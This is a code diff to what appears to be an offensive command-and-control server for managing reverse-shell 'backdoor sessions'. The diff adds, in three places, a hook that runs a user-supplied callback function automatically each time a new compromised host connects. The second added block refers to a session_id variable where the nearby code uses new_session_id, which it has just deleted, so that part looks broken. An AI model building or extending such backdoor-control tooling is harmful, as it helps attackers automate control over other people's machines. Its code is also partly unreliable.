@@ -1101,6 +1101,14 @@ class Hoaxshell(BaseHTTPRequestHandler):
 				
 			print_to_prompt(f'\r[{GREEN}Shell{END}] Backdoor session established on {ORANGE}{self.client_address[0]}{END}')
 
+			if Callback_Settings.callback_file != None:
+				print_to_prompt(f'\r{GREEN}[Callback]{END} Executing callback function...{Callback_Settings.callback_file}')
+
+				if Callback_Settings.callback_function(Sessions_Manager.active_sessions[session_id]):
+					print_to_prompt(f'\r{GREEN}[Callback]{END} Callback function executed successfully.')
+				else:
+					print_to_prompt(f'\r{WARN}[Callback]{END} Callback function failed to execute.')
+
 			try:
 				Thread(target = self.monitor_shell_state, args = (session_id,), name = f'session_state_monitor_{self.client_address[0]}', daemon = True).start()
 			except:
@@ -1599,6 +1607,14 @@ class Core_Server:
 						print_to_prompt(f'\r[{GREEN}Shell{END}] Backdoor session established on {ORANGE}{Sessions_Manager.active_sessions[new_session_id]["IP Address"]}{END} (Owned by {ORANGE}{self.sibling_servers[sibling_id]["Hostname"]}{END})')
 						del decrypted_data, new_session_id
 						Core_Server.send_msg(conn, self.response_ack(sibling_id))
+
+						if Callback_Settings.callback_file != None:
+							print_to_prompt(f'\r{GREEN}[Callback]{END} Executing callback function...{Callback_Settings.callback_file}')
+
+							if Callback_Settings.callback_function(Sessions_Manager.active_sessions[session_id]):
+								print_to_prompt(f'\r{GREEN}[Callback]{END} Callback function executed successfully.')
+							else:
+								print_to_prompt(f'\r{WARN}[Callback]{END} Callback function failed to execute.')
 
 
 
@@ -2470,6 +2486,14 @@ class TCP_Sock_Multi_Handler:
 			Hoaxshell.command_pool[session_id] = []
 			print_to_prompt(f'\r[{GREEN}Shell{END}] Backdoor session established on {ORANGE}{address[0]}{END}')
 			print_to_prompt(f'\r[{WARN}] Failed to resolve hostname. Use "repair" to declare it manually.') if hostname_undefined else chill()
+
+			if Callback_Settings.callback_file != None:
+				print_to_prompt(f'\r{GREEN}[Callback]{END} Executing callback function...{Callback_Settings.callback_file}')
+
+				if Callback_Settings.callback_function(Sessions_Manager.active_sessions[session_id]):
+					print_to_prompt(f'\r{GREEN}[Callback]{END} Callback function executed successfully.')
+				else:
+					print_to_prompt(f'\r{WARN}[Callback]{END} Callback function failed to execute.')
 
 			new_session_data = deepcopy(Sessions_Manager.active_sessions[session_id])
 			new_session_data['session_id'] = session_id
